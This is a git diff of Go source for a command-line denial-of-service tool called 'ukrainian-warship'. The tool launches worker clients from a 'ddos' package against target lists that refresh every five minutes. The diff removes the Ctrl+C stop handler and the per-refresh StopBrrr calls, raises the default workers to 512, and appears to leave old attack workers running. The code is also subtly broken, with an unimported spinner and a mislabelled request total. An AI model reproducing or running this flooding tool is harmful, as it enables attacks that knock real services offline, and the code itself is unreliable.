@@ -17,9 +17,6 @@ package cmd
 
 import (
 	"fmt"
-	"os"
-	"os/signal"
-	"strconv"
 	"time"
 
 	"github.com/seedpockets/ukrainian-warship/pkg/ddos"
@@ -49,55 +46,56 @@ Default worker amount is 512 divided by number of targets.`,
 
 func init() {
 	rootCmd.AddCommand(killCmd)
-	killCmd.Flags().Int("workers", 0, "--workers=1024")
+	killCmd.Flags().Int("workers", 512, "--workers=1024")
 }
 
 func AutoKill(workers int) {
-	clients := Kill(workers)
-	fmt.Println("Monitoring accuracy...")
-	s := make(chan os.Signal, 1)
-	signal.Notify(s, os.Interrupt)
-	running := true
-	// Stop DDoS on Crtl+C
-	go func() {
-		for sig := range s {
-			fmt.Println("Caught os signal: ", sig.String())
-			fmt.Println("Stopping Brrr...")
-			running = false
-			for i := range clients {
-				clients[i].StopBrrr()
-			}
-			os.Exit(0)
-		}
-	}()
+	//s := make(chan os.Signal, 1)
+	//signal.Notify(s, os.Interrupt)
+	//running := true
+	//// Stop DDoS on Crtl+C
+	//go func() {
+	//	for sig := range s {
+	//		fmt.Println("Caught os signal: ", sig.String())
+	//		fmt.Println("Stopping Brrr...")
+	//		running = false
+	//		for i := range clients {
+	//			clients[i].StopBrrr()
+	//		}
+	//		os.Exit(0)
+	//	}
+	//}()
 	// run and refresh targets every 5 min
+	spin := spinner.New(spinner.CharSets[11], 100*time.Millisecond) // Build our new spinner
+	running := true
 	for running {
+		spin.Start()
+		clients := Kill(workers)
+		fmt.Println("Monitoring accuracy...")
 		refresh := true
 		refreshTime := time.Now().Add(time.Minute * 5).Unix() // refresh targets interval
 		for refresh {
 			if time.Now().Unix() > refreshTime {
-				for i := range clients {
-					fmt.Println("Ukrainian Warship stop brrr...")
-					clients[i].StopBrrr()
-				}
+				//for i := range clients {
+				//	fmt.Println("Ukrainian Warship stop brrr...")
+				//	clients[i].StopBrrr()
+				//}
+				clients = nil
 				refresh = false
 			} else {
 				clearScreen()
-				fmt.Println(string(colorGreen) + "Updates targets every 5 min..." + string(colorReset))
-				fmt.Println("Total" + "\t\t" + "Success" + "\t" + "Target")
-				var totalRequests int64 = 0
+				fmt.Println(string(colorGreen) + "Updates targets every 5 min...\n\n" + string(colorReset))
+				fmt.Println("Target")
+				fmt.Println("_________________________________________________________")
+				totalRequests := len(clients) + 1
 				for _, c := range clients {
-					// fmt.Println(c.Target, " ")
-					// amount, failed := c.Result()
-					// amount, failed := 0, 0
-					totalRequests += c.AmountRequests
-					fmt.Println(strconv.Itoa(int(c.AmountRequests)) + "\t\t" + strconv.Itoa(int(c.SuccessRequest)) + "\t" + c.Target)
+					fmt.Println(c.Target)
 				}
 				fmt.Println("Total: ", totalRequests)
 			}
-			time.Sleep(time.Millisecond * 100)
+			time.Sleep(time.Millisecond * 500)
 		}
-		clients = Kill(workers)
+		spin.Stop()
 	}
 }
 
